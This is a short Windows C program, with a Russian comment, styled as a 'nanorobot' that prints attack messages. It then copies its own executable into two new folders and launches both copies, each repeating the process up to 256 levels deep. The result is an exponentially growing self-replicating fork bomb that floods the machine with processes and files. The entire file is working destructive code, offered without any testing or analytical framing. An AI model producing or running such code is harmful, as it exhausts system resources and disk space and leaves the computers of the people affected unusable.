#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <direct.h>
#include <time.h>

#define MAX_PATH_LENGTH 1024

int current_depth = 0;
int max_depth = 256;

BOOL launch_process(const char* working_dir, const char* exe_path, int depth) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char cmd_line[MAX_PATH_LENGTH * 2];
    
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    
    snprintf(cmd_line, sizeof(cmd_line), "\"%s\" %d %d", exe_path, depth, max_depth);
    
    if (CreateProcess(
        NULL,
        cmd_line,
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        working_dir,
        &si,
        &pi
    )) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return TRUE;
    }
    
    return FALSE;
}

void create_recursive_structure() {
    if (current_depth >= max_depth) {
        return;
    }
    
    char executable_path[MAX_PATH_LENGTH];
    char path[MAX_PATH_LENGTH];
    
    // Исправление: GetModuleFileName записывает путь в буфер 'path'
    GetModuleFileName(NULL, path, MAX_PATH_LENGTH);
    strcpy(executable_path, path);
    
    CreateDirectory("NANOROBOT SYSTEMD 0", NULL);
    CreateDirectory("NANOROBOT SYSTEMD 1", NULL);
    
    char copy_path_0[MAX_PATH_LENGTH];
    char copy_path_1[MAX_PATH_LENGTH];
    char working_dir_0[MAX_PATH_LENGTH];
    char working_dir_1[MAX_PATH_LENGTH];
    
    char current_dir[MAX_PATH_LENGTH];
    GetCurrentDirectory(MAX_PATH_LENGTH, current_dir);
    
    snprintf(copy_path_0, sizeof(copy_path_0), "%s\\NANOROBOT SYSTEMD 0\\nanorobot%dx%d.exe", current_dir, 0, current_depth);
    snprintf(copy_path_1, sizeof(copy_path_1), "%s\\NANOROBOT SYSTEMD 1\\nanorobot%dx%d.exe", current_dir, 1, current_depth);
    snprintf(working_dir_0, sizeof(working_dir_0), "%s\\NANOROBOT SYSTEMD 0", current_dir);
    snprintf(working_dir_1, sizeof(working_dir_1), "%s\\NANOROBOT SYSTEMD 1", current_dir);
    
    CopyFile(executable_path, copy_path_0, FALSE);
    CopyFile(executable_path, copy_path_1, FALSE);

    if (current_depth + 1 < max_depth) {
        launch_process(working_dir_0, copy_path_0, current_depth + 1);
        launch_process(working_dir_1, copy_path_1, current_depth + 1);
    }
}

int main(int argc, char* argv[]) {
    srand(time(NULL) + clock());
    current_depth = 0;
    if (argc >= 2) {
        current_depth = atoi(argv[1]);
    }
    for(int i=0;i<10;i++) {
        printf("Nanorobot#%d attacks!!\n", rand());
        Sleep(rand() % 200);
    }
    create_recursive_structure();
    return 0;
}